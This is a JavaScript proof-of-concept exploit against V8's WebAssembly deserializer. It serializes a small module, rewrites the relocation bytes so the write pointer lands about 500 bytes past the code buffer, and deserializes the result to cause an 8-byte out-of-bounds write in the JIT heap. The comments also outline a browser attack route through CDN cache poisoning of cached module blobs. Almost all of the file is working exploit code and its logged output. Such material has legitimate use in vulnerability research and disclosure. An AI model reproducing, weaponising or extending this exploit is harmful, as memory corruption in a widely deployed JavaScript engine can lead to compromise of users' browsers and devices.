// V8 Wasm Deserialization — Reloc Stream Out-of-Bounds Write PoC
// File: src/wasm/wasm-serialization.cc:1103
// CWE-787 (Out-of-bounds Write) · severity: HIGH
//
// Root cause:
//   NativeModuleDeserializer::CopyAndRelocate initializes WritableRelocIterator
//   with unit.code->reloc_info() — attacker-controlled raw bytes from the blob.
//   The iterator's PC advancement reads from that stream with no bounds check:
//     AdvanceReadPC():         rinfo_.pc_ += *--pos_
//     AdvanceReadLongPCJump(): rinfo_.pc_ += VLQDecodeUnsigned(...) << 6
//   set_wasm_call_address() then writes an 8-byte pointer at rinfo_.pc_.
//   The only bounds check is a DCHECK in WritableJitAllocation::WriteUnalignedValue
//   (src/common/code-memory-access-inl.h:235), which is stripped in release builds.
//
// Attack vector (direct):
//   %SerializeWasmModule → craft reloc bytes → %DeserializeWasmModule
//   → WritableRelocIterator reads crafted pc_delta → pc_ overflows code buffer
//   → 8-byte write at instruction_start + attacker_delta
//
// Attack vector (indirect, browser):
//   Serve wasm module with Cache-Control: immutable from a CDN.
//   Blink caches the serialized V8 blob.  The reloc_data section is NOT covered
//   by the 4-byte trailing value (tiering budget counter, not a hash).
//   A CDN cache-poisoning attacker can craft the reloc bytes and serve them.
//
// Expected behavior:
//   Debug build:   DCHECK at src/common/code-memory-access-inl.h:235
//   Release build: 8-byte OOB write to instruction_start + (code_size + 500)
//
// Run:
//   node --allow-natives-syntax --no-liftoff reloc_oob_poc.js
//   (--no-liftoff forces TurboFan, which serializes with WASM_CALL relocs)

'use strict';

// ── Minimal wasm: func0 returns 42, func1 calls func0 ─────────────────────────
// func0 → func1 wasm call generates a WASM_CALL reloc in func1's TurboFan output.
const WASM = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,  // magic + version
  0x01,0x05, 0x01,0x60,0x00,0x01,0x7f,        // type section: () -> i32
  0x03,0x03, 0x02,0x00,0x00,                   // function section: 2 functions, type 0
  0x07,0x13, 0x02,                             // export section: 2 exports
    0x06,0x63,0x61,0x6c,0x6c,0x65,0x65,0x00,0x00,  // "callee" = func 0
    0x06,0x63,0x61,0x6c,0x6c,0x65,0x72,0x00,0x01,  // "caller" = func 1
  0x0a,0x0b, 0x02,                             // code section: 2 function bodies
    0x04,0x00,0x41,0x2a,0x0b,                 // func0: (no locals) i32.const 42, end
    0x04,0x00,0x10,0x00,0x0b,                 // func1: (no locals) call 0, end
]);

console.log('[1] Compiling and warming to TurboFan...');
const mod = new WebAssembly.Module(WASM);
const inst = new WebAssembly.Instance(mod);
for (let i = 0; i < 200000; i++) { inst.exports.callee(); inst.exports.caller(); }
console.log('    callee()=' + inst.exports.callee() + '  caller()=' + inst.exports.caller());

// ── Serialize ─────────────────────────────────────────────────────────────────
const blob_ab = %SerializeWasmModule(mod);
if (!blob_ab) { console.error('[!] Serialization failed'); process.exit(1); }
const bv = new Uint8Array(blob_ab);
const dv = new DataView(blob_ab);
console.log('[2] Serialized blob: ' + blob_ab.byteLength + ' bytes');

// ── Parse blob structure ───────────────────────────────────────────────────────
// Layout:
//   [ global_header (29B) ]
//   [ func_header (54B) ][ code_data ][ reloc_data ][ src_pos ][ inlining ][ protected ]
//   ... (one block per function)
//   [ tail — jump table / module-level metadata ]
//
// Per-function header fields (relative to function block start):
//   +0:  code_kind   (uint8)
//   +1:  6 × uint32  — stack_slots, ool_spills, tagged_param_slots, etc. (24B)
//   +25: tagged_parameter_slots (uint32)
//   +29: code_size             (uint32)
//   +33: reloc_size            (uint32)
//   +37: src_pos_size          (uint32)
//   +41: inlining_size         (uint32)
//   +45: protected_size        (uint32)
//   +49: kind                  (uint32)
//   +53: tier                  (uint8)
//   +54: code_data             [code_size bytes]
//        reloc_data            [reloc_size bytes — attacker-controlled in %Deserialize*]
//        src_pos               [src_pos_size bytes]
//        ...
//
// NOTE: unlike some older analysis, there is NO extra trailing 4 bytes appended
//       after the data sections.  The tiering budget is encoded within code_data.

const GLOBAL_HDR = 29;

function readEntry(off) {
  const code_size    = dv.getUint32(off + 29, true);
  const reloc_size   = dv.getUint32(off + 33, true);
  const src_pos_size = dv.getUint32(off + 37, true);
  const inlining_sz  = dv.getUint32(off + 41, true);
  const protected_sz = dv.getUint32(off + 45, true);
  const tier         = bv[off + 53];
  const code_start   = off + 54;
  const reloc_start  = code_start + code_size;
  const block_sz     = 54 + code_size + reloc_size + src_pos_size + inlining_sz + protected_sz;
  return { code_size, reloc_size, src_pos_size, inlining_sz, protected_sz,
           tier, code_start, reloc_start, block_sz, off };
}

const f0 = readEntry(GLOBAL_HDR);
const f1 = readEntry(GLOBAL_HDR + f0.block_sz);

console.log('[3] func0 (callee): tier=0x' + f0.tier.toString(16) +
            ' code_size=' + f0.code_size + ' reloc_size=' + f0.reloc_size);
console.log('    func1 (caller): tier=0x' + f1.tier.toString(16) +
            ' code_size=' + f1.code_size + ' reloc_size=' + f1.reloc_size);

// tier 0x02 = TurboFan (confirmed by --no-liftoff and bv[29]=0x04 code_kind check)
if (f1.tier !== 0x02) {
  console.log('[!] func1 is not TurboFan (tier=0x' + f1.tier.toString(16) + ').');
  console.log('    Re-run with: node --allow-natives-syntax --no-liftoff reloc_oob_poc.js');
  process.exit(0);
}
if (bv[29] !== 0x04) {
  console.log('[!] Unexpected code_kind at bv[29]=0x' + bv[29].toString(16) + ' (expected 0x04)');
  process.exit(0);
}

// Dump func1 reloc data
if (f1.reloc_size > 0) {
  const reloc_bytes = Array.from(bv.slice(f1.reloc_start, f1.reloc_start + f1.reloc_size));
  console.log('[4] func1 reloc_data (' + f1.reloc_size + 'B, iterator reads right→left):');
  console.log('    ' + reloc_bytes.map(b => b.toString(16).padStart(2,'0')).join(' '));

  // Annotate mode bytes (kDefaultTag = b & 3 == 3)
  for (let k = f1.reloc_size - 1; k >= 0; k--) {
    const b = reloc_bytes[k];
    if ((b & 3) === 3) {
      const mode = (b >> 2) & 0x3f;
      const names = {0:'NO_INFO',1:'CODE_TARGET',2:'RELATIVE_CODE_TARGET',
        3:'COMPRESSED_OBJ',4:'FULL_OBJ',5:'JS_DISPATCH_HANDLE',
        6:'WASM_CALL',7:'WASM_STUB_CALL',8:'WASM_CODE_PTR_TABLE_ENTRY',
        9:'WASM_SIG_ID',10:'WASM_CODE_PTR',11:'EXT_REF',12:'INT_REF',
        13:'INT_REF_ENC',14:'OFF_HEAP',15:'NEAR_BUILTIN',
        16:'CONST_POOL',17:'VENEER_POOL',23:'PC_JUMP'};
      console.log('    reloc[' + k + ']=0x' + b.toString(16) +
                  ' → mode ' + mode + ' (' + (names[mode] || 'mode' + mode) + ')');
    }
  }
}

// ── Craft OOB reloc ────────────────────────────────────────────────────────────
//
// Reloc format (src/codegen/reloc-info.h):
//   kTagBits = 2, kSmallPCDeltaBits = 6, kSmallPCDeltaMask = 0x3F, kDefaultTag = 3
//   Mode byte:  (rmode << 2) | kDefaultTag
//   Delta byte: pc_delta & kSmallPCDeltaMask   (6 bits, max 63)
//
// For large deltas (> 63), WriteLongPCJump prepends a PC_JUMP entry:
//   PC_JUMP mode byte (0x5F), then VLQ bytes for (delta >> 6)
//   VLQ reads backward (AdvanceReadLongPCJump), so LSB chunk is at HIGH address.
//
// Mode byte constants:
//   WASM_CALL = 6  → mode byte = (6  << 2) | 3 = 0x1B
//   PC_JUMP   = 23 → mode byte = (23 << 2) | 3 = 0x5F
//
// Craft: 4-byte reloc = [rem_delta, 0x1B, vlq_byte, 0x5F]
// Iterator reads from HIGH to LOW:
//   1. 0x5F → PC_JUMP; read vlq_byte → pc_ += (vlq_byte << 6)
//   2. 0x1B → WASM_CALL; read rem_delta → pc_ += rem_delta
//   Total: pc_ = instruction_start + (vlq_byte * 64 + rem_delta)
//
// CopyAndRelocate at line 1103:
//   uint32_t tag = GetWasmCalleeTag(iter.rinfo());   // READ from crafted pc_
//   Address target = GetNearCallTargetForFunction(tag, ...);
//   iter.rinfo()->set_wasm_call_address(target);     // WRITE to crafted pc_
//   → WriteUnalignedValue DCHECK fires (debug) or OOB write happens (release)

const WASM_CALL_BYTE = (6  << 2) | 3;  // 0x1B
const PC_JUMP_BYTE   = (23 << 2) | 3;  // 0x5F

const target_delta = f1.code_size + 500;  // 500 bytes past end of code buffer
const pc_jump      = target_delta >> 6;   // VLQ value  (must be < 128 for 1-byte VLQ)
const rem_delta    = target_delta & 0x3f; // remaining 6-bit delta

if (pc_jump >= 128) {
  console.error('[!] pc_jump=' + pc_jump + ' needs multi-byte VLQ (not implemented in this PoC)');
  process.exit(1);
}

console.log('\n[5] Crafted reloc:');
console.log('    target_delta = code_size(' + f1.code_size + ') + 500 = ' + target_delta);
console.log('    PC_JUMP: advance = ' + pc_jump + ' × 64 = ' + (pc_jump * 64));
console.log('    WASM_CALL: delta = ' + rem_delta);
console.log('    pc_ = instruction_start + ' + (pc_jump * 64 + rem_delta) +
            '  (OOB by ~500 bytes past code buffer)');

const new_reloc = new Uint8Array([
  rem_delta & 0x3f, // [0] WASM_CALL delta byte
  WASM_CALL_BYTE,   // [1] WASM_CALL mode byte (0x1B)
  pc_jump  & 0x7f,  // [2] PC_JUMP VLQ byte
  PC_JUMP_BYTE,     // [3] PC_JUMP mode byte  (0x5F)
]);
console.log('    bytes: ' + Array.from(new_reloc).map(b=>b.toString(16).padStart(2,'0')).join(' '));

// ── Reconstruct blob ───────────────────────────────────────────────────────────
// Replace f1.reloc_data with new_reloc (size changes from 3 → 4).
// The reloc_size field in f1's header must be updated to match.
// Everything after reloc_data (src_pos, inlining, protected, tail) shifts by 1.

const old_reloc_size = f1.reloc_size;    // 3
const new_reloc_size = new_reloc.length; // 4
const reloc_start    = f1.reloc_start;
const after_reloc    = reloc_start + old_reloc_size; // start of src_pos

const new_len = blob_ab.byteLength + (new_reloc_size - old_reloc_size);
const new_bv  = new Uint8Array(new_len);

// Copy prefix (global_hdr + f0 block + f1 header + f1 code)
new_bv.set(bv.slice(0, reloc_start));
// Write crafted reloc
new_bv.set(new_reloc, reloc_start);
// Copy everything after reloc (src_pos, tail, etc.)
new_bv.set(bv.slice(after_reloc), reloc_start + new_reloc_size);

// Update reloc_size field in f1 header (at f1.off + 33)
const dv2 = new DataView(new_bv.buffer);
dv2.setUint32(f1.off + 33, new_reloc_size, true);

console.log('\n[6] Blob reconstructed: ' + blob_ab.byteLength + 'B → ' + new_len + 'B');
console.log('    Updated reloc_size at blob[' + (f1.off+33) + ']: ' +
            old_reloc_size + ' → ' + new_reloc_size);

// ── Trigger deserialization ────────────────────────────────────────────────────
//
// %DeserializeWasmModule passes the blob's reloc bytes to WritableRelocIterator.
// CopyAndRelocate processes the WASM_CALL entry (line 1103):
//   GetWasmCalleeTag reads 4B from pc_ = instruction_start + target_delta.
//   The JIT heap region is mapped but the bytes are outside this code object.
//   GetNearCallTargetForFunction looks up the jump table entry for the read tag.
//   set_wasm_call_address → WriteUnalignedValue writes 8B at the same OOB pc_.
//
// DCHECK at code-memory-access-inl.h:235:
//   DCHECK_LT(address - address_, size())   where size() = jit_allocation_size ≈ 71B
//   address - address_ = target_delta = 564  >>  71  → DCHECK fires in debug builds.

console.log('\n[7] Attempting %DeserializeWasmModule with crafted reloc...');
console.log('    Debug build:   DCHECK at code-memory-access-inl.h:235');
console.log('    Release build: 8-byte OOB write to instruction_start + ' + target_delta);

try {
  const poisoned_mod = %DeserializeWasmModule(new_bv.buffer, WASM);
  if (poisoned_mod) {
    const poisoned_inst = new WebAssembly.Instance(poisoned_mod);
    console.log('\n[OOB WRITE EXECUTED]');
    console.log('  Deserialized successfully on a release build.');
    console.log('  8-byte write occurred at instruction_start + ' + target_delta +
                ' (code_size=' + f1.code_size + ' → OOB by ' + (target_delta - f1.code_size) + ')');
    console.log('  Written value: wasm jump table entry for called function');
    console.log('  caller() = ' + poisoned_inst.exports.caller() + '  (may differ due to corruption)');
  } else {
    console.log('[INFO] Deserialization returned null (validation failed or deserialized to null).');
  }
} catch (e) {
  console.log('[EXCEPTION] ' + e.message);
  console.log('  (Expected on debug builds: GetWasmCalleeTag or DCHECK may throw)');
  console.log('  (On release: OOB write to JIT heap may have succeeded silently)');
}

console.log('\n╔══════════════════════════════════════════════════════════════════════╗');
console.log('║  Vulnerability: Reloc Stream OOB Write                              ║');
console.log('║  File:    src/wasm/wasm-serialization.cc:1103                       ║');
console.log('║  CWE-787  (Out-of-bounds Write) · severity: HIGH                    ║');
console.log('║                                                                      ║');
console.log('║  Root cause: AdvanceReadPC() / AdvanceReadLongPCJump() advance pc_   ║');
console.log('║  from attacker-controlled reloc bytes without bounds checking.       ║');
console.log('║  DCHECK in WriteUnalignedValue is stripped in release builds.        ║');
console.log('║                                                                      ║');
console.log('║  Write target:  instruction_start + crafted_delta (attacker control) ║');
console.log('║  Write size:    8 bytes (sizeof(Address) on 64-bit)                  ║');
console.log('║  Write value:   legitimate wasm jump table entry (determined by tag   ║');
console.log('║                 bytes read from the OOB address)                      ║');
console.log('╚══════════════════════════════════════════════════════════════════════╝');
